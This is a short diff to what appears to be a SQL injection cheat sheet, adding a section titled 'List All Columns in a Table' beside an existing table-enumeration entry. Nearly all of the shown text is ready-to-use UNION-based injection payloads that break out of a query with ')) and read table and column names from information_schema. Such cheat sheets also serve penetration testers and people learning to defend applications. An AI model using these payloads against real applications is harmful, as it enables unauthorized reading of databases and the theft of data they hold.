@@ -491,6 +491,12 @@ Enumerate tables inside a target DB
 ')) UNION SELECT 1, table_name, '', 1 FROM information_schema.tables WHERE table_schema='target_db' -- -
 ```
 
+List All Columns in a Table
+
+```sql
+')) UNION SELECT 1, column_name, '', 1 FROM information_schema.columns WHERE table_name='target_table' -- -
+```
+
 Enumerate columns in a specific table
 
 ```sql
